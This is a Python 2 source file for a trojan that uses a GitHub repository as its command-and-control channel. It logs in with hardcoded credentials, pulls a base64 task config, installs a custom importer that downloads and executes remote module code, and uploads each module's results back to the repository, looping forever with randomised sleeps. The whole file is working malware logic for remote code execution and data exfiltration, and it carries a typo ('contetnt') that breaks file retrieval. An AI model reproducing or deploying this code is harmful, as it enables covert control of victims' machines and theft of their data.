import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

unt_id = "abc"

unt_config = "%s.json" % unt_id
data_path = "data/%s/" % unt_id
unt_mod = []
task_queue = Queue.Queue()
confed = False


def conn_to_git():
    gh = login(username="Kosma789", password="mio7aw6lms")
    repo = gh.repository("Kosma789", "unt1")
    branch = repo.branch("master")

    return gh, repo, branch


def get_file_cont(filepath):

    gh, repo, branch = conn_to_git()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "found: %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.contetnt

    return None


def get_unt_conf():
    global confed
    config_json = get_file_cont(unt_config)
    config = json.loads(base64.b64decode(config_json))
    confed = True

    for task in config:
        if task['module'] not in sys.modules:
            exec ("import %s" % task['module'])

    return config


def store_modules_result(data):
    gh, repo, branch = conn_to_git()
    remote_path = "data/%s/%d.data" % (unt_id, random.randint(1000, 10000))
    repo.create_file(remote_path, "confirmed", base64.b64encode(data))


class GitImporter(object):

    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if confed:
            print "[*] Proba pobrania %s" % fullname
            new_library = get_file_cont("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):

        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_modules_result(result)

    return

sys.meta_path = [GitImporter()]
while True:
    if task_queue.empty():

        config = get_unt_conf()

        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
